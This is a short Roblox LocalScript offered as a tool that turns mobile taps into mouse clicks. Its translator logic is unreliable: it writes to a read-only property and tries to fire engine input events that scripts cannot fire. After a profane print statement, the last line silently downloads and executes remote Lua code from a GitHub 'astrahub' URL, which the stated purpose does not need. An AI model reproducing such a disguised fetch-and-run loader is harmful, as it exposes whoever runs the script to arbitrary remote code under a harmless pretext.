--// Tap → Mouse1Click Translator
--// Put this in StarterPlayerScripts as a LocalScript

local UIS = game:GetService("UserInputService")
local Player = game.Players.LocalPlayer
local Mouse = Player:GetMouse()

-- Detects mobile
local isMobile = UIS.TouchEnabled and not UIS.MouseEnabled

if not isMobile then
    return -- PC already uses real mouse clicks
end

print("[Mobile Translator] Enabled: Taps will act as Mouse1Click()")

-- Fires a simulated mouse click
local function fireClick(pos)
    -- move virtual mouse to tap position
    Mouse.Hit = CFrame.new(pos.X, pos.Y, 0)

    -- fire a Mouse1Click equivalent
    -- Many systems use InputBegan for Enum.UserInputType.MouseButton1
    UIS.InputBegan:Fire({
        UserInputType = Enum.UserInputType.MouseButton1,
        Position = pos
    }, false)

    task.wait()

    UIS.InputEnded:Fire({
        UserInputType = Enum.UserInputType.MouseButton1,
        Position = pos
    }, false)
end

-- Listen for tap events
UIS.TouchTap:Connect(function(touchPositions)
    local tapPos = touchPositions[1]
    fireClick(tapPos)
end)

print("HI BITCH IM DOING THE MOBIEL SCIRPT LIKE FUCKIG NOW")
task.wait(2)
loadstring(game:HttpGet(('https://raw.githubusercontent.com/azureblueday/astrahub/refs/heads/main/astra59.luau')))()
